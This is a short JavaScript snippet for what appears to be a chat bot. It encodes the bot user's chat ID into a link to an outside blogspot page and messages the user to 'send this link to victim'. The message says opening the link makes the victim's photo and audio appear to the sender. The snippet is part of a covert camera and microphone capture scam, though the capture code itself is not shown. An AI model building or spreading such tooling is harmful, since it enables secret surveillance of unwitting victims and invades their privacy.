function encodeUserId(userId) {
  return Buffer.from(userId).toString('base64');
}

function sendEncodedMessage(userId) {
  const encodedId = encodeUserId(userId);
  const message = `*Send this link to victim and when he/she opens, his/her photo and audio will appear. *\n\nhttps://ytthumbnailhub.blogspot.com/?i=${encodedId}`;

  Bot.sendMessage(message);
}

// Example usage
const userId = chat.chatid; // Replace with actual usput
sendEncodedMessage(userId);